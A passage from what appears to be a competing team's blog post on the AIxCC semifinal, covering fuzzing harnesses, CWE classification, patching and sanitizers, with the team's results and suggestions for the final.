was full of surprises; the program\u0026rsquo;s structure was provided by the harness, which is alas what we primarily focused on, and the blob needed to be fed to the harness in a way that triggers the bug. The types of system calls we could interact with were limited by the harness, and our task was to find the right data input that would lead the harness to invoke the necessary sequence of system calls with the correct parameters. In other words, we needed to understand the harness first before dealing with the Linux kernel bugs.\nLater, the Jenkins harness was announced, and more surprisingly, it was a fuzz driver (often called a fuzzing harness), a standalone program designed to invoke APIs for fuzz testing. In May, a new CP, called mock-cp (a userspace program), was introduced along with a new harness format, which was simply a shell script executing a CP binary with the provided input. Such diverse formats got us thinking that our CRS should adopt LLM to figure out the structure of the programs and CPs first; like how to compile, how to correctly run, etc.\nBy June, the harness format was officially established - surprisingly, yet not entirely unexpected: libfuzzer for userspace programs (mock-cp and Nginx), jazzer for Java programs (Jenkins), while retaining the blob-based harness for the Linux kernel. We continually updated our CRS to adapt to these changes, but many of these decisions rendered our LLM-based components unnecessary. This decision, however, greatly helped all the participating teams by reducing the engineering time needed for game operation. Unfortunately, we were too proactive in reacting to these changes and ended up wasting some engineering time as a result 😊.\nA harness\u0026rsquo;s role is crucial in the AIxCC competition; it sets the context for the CRS to trigger the bug and serves as a key factor in adjusting the difficulty of bug discovery. Therefore, it\u0026rsquo;s important to strike a balance: it should provide enough detail to relieve the CRS from unnecessary burdens, allowing it to focus on bug finding, but without revealing too much information about the bugs.\nMisunderstanding 3. Proof-of-understanding Unlike CGC, which treated the PoV (a proof-of-concept exploit) as sufficient proof of bug discovery, AIxCC required additional information—specifically, the bug type as classified by CWE, to be provided along with the PoV. This was an interesting decision, as AIxCC required CRS to find bugs in the source code, whereas CGC focused on discovering bugs in binaries.\nOur team spent a lot of time brainstorming how to accurately identify CWE categories, primarily by using LLM prompts that leverage crashing inputs, sanitizer reports, related code snippets, outputs from static analyzers, and more. However, the notion of CWEs can be ambiguous when used as a scoring mechanism for the competition. For instance, should CVE-2021-43267 be classified as (1) CWE-122 (Heap-based Buffer Overflow), (2) CWE-787 (Out-of-bounds Write), or (3) CWE-20 (Improper Input Validation)? The first two describe the symptoms caused by the bug, while the third identifies the root cause, as the patch for this bug involved adding input validations.\nIn the end, AIxCC shifted the focus from PoV to identifying the bug-introducing commit (BIC) - the specific hash or commit ID in the git repository. Combined with the fuzzing harness and PoV, the CRS\u0026rsquo;s task was to run the fuzzing harness and perform a git-bisect to pinpoint the BIC in the repository. We did a simple bisecting in the semifinal but lots of improvement required to be functional for the final event.\nMisunderstanding 4. Semantic patching Patching is one of the most intriguing aspects of AIxCC. In CGC, the PoV was typically a simple exploit (like arbitrary read/write/execute), so mitigation strategies (e.g., adding a stack canary) could effectively thwart the PoV. In fact, patches could be applied without even knowing the specific bug; for example, adding a stack canary to all functions in a binary can prevent buffer overflow exploits that might exist in some places.\nThe challenge in CGC was that the focus was on the binary, and the organizers introduced rules such as a minimum number of bytes changed and performance overheads added to the scoring rubric (e.g., instrumenting all memory accesses to prevent out-of-bound errors). These rules were designed to encourage competitors to generate correct patches. Ultimately, this forced CRS to weigh the pros and cons of universal patching, as both exploiting and patching were extremely difficult during the CGC era, resulting in a trade-off between losing points from exploitation versus losing points from patching and availability.\nIn AIxCC, the CRS must generate a semantically correct patch that not only fixes the identified PoV but also maintains the functional correctness of the CP. This is a tricky task, as correctness cannot be formally defined for CRS - some functional changes may be acceptable, while others may not, depending on the code owner\u0026rsquo;s criteria. One approach to addressing this ambiguity is to provide test code to see if the patch passes the provided, so-called public tests. However, CRS must still account for private tests set by the organizers.\nIn the semifinals, our CRS submitted a patch that successfully prevented the crash and passed the public tests given to us during the competition, but was ultimately rejected in the private functionality tests. We\u0026rsquo;re eager to learn more about the bug and the patch!\nMisunderstanding 5: Sanitizers The concept of sanitizers was unclear to our team until we encountered their concrete implementation for memory-safe languages like Java, and more specifically, for Jenkins, a web application written in Java! The role of a sanitizer, essentially a bug oracle, is to determine whether a bug has been correctly triggered.\nIn memory-unsafe languages like C, standard tools like ASAN and UBSAN can serve as sanitizers to catch memory-safety issues with low or no false positives (e.g., out-of-bound accesses should never occur). However, in memory-safe languages, things get trickier. For example, is executing a command a legitimate feature in CI tools like Jenkins, or should it be treated as a command injection (CWE-78)?\nIn other words, sanitizers are more CP-specific rather than programming language-specific; each CP needs to provide custom sanitizers (e.g., path traversal sanitizers).\nOur team initially spent time working on finding web-related bugs like XSS or CSRF in Jenkins - areas where we believed LLMs could excel in seed generation. However, once AIxCC announced that the sanitizers for Java would be jazzer sanitizers, we decided to shift our focus more towards standard jazzer-based fuzzing.\nSemifinal Our team dedicated most of our engineering effort to building a CRS for the Linux Kernel, and we\u0026rsquo;re proud that our CRS was able to find and correctly generate a patch for CVE-2021-43267 in the end. However, during the semifinal, it appeared that only one harness was provided, similar to the exemplar, and none of the CRSes functioned properly for the Linux Kernel. We loved to know more about how our Linux CRS functioned during the competition.\nIn summary, our CRS earned a total of six achievement badges: five for discovering bugs (i.e., first bloods) and one for a patch.\nOur CRS found several unique bugs, which we will describe in a later blog post!\nAside from the known CPs—Linux (C), Jenkins (Java), and Nginx (C) - there were new CPs introduced, namely Tika (Java) and sqlite3 (C). Our CRS performed relatively well on sqlite3, but unfortunately, our Java CRS struggled with Tika. We would love to learn more about what happened during the competition. Tika, a popular file format parser, has many unique features, such as recursively parsing embedded objects, which may have contributed to the challenges we faced.\nLooking Ahead to the AIxCC Final 🎉 AIxCC Finalists\rWe are thrilled that our team has advanced to the AIxCC finals! We have several ideas that could make the competition even more exciting:\nDifferent execution times based on code complexity.\nThe Linux kernel, with its 6,000 files and 20 million lines of code, requires substantial time for bookkeeping like building, bootstrapping, and bisecting. Compared to smaller programs (e.g., 200k in Tika), it would be beneficial to allocate more time for CRSes to navigate such complex codebases.\nMore programming languages and their combinations.\nTop candidates include Python, Rust, and JavaScript/HTML, along with combinations like JNI (C) in Java or Rust device drivers in the Linux kernel. These would offer a more comprehensive evaluation of CRS capabilities in diverse and challenging settings where CRS is most needed.\nStandardized execution environments.\nStandardizing the compiler (e.g., clang-18), runtime (e.g., JVM version), and base Docker image ahead of time would help teams explore more advanced techniques, such as LLM-based instrumentation, in a controlled environment.\nImproved visualization during the competition.\nWhile the AIxCC village was impressively set up, competing teams and participants had limited visibility into the competition\u0026rsquo;s progress and how each CRS was functioning. To capture more attention from the DEF CON audience, it would be beneficial to expose more technical information during the competition - such as showing current prompts of each CRS in turn, their CPU usage, or even stdout from CRSes (for fun), along with explanations of the progress.\nWith our baseline system up and running, it’s time for our team to explore the possibility of incorporating LLMs or ML techniques into our CRS workflow. If you’re passionate about AIxCC and as committed to the competition as we are, feel free to contact us!\nWe are fortunate to have support from generous sponsors like GT/GTRI, Samsung, and KAIST/NYU. If your company is interested in sponsoring our team, we would be happy to discuss further!\nLast but not least, we want to extend our heartfelt thanks to the AIxCC organizers for launching the competition we\u0026rsquo;ve been craving. Hackers thrive on competition-driven innovation, and this has been an exciting opportunity for all of us.\nI think it’s one of the worst names ever chosen by a security researcher; non-security folks often think it\u0026rsquo;s a really dumb technique. But if you dig into the details, it\u0026rsquo;s actually an impressive AI tool. It operates entirely autonomously, adapting to unknown code, self-learning from past executions, using feedback loops similar to backpropagation, and employing cost functions like coverage maps, and more! Most importantly, like deep learning, it works incredibly well in practice!\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"}]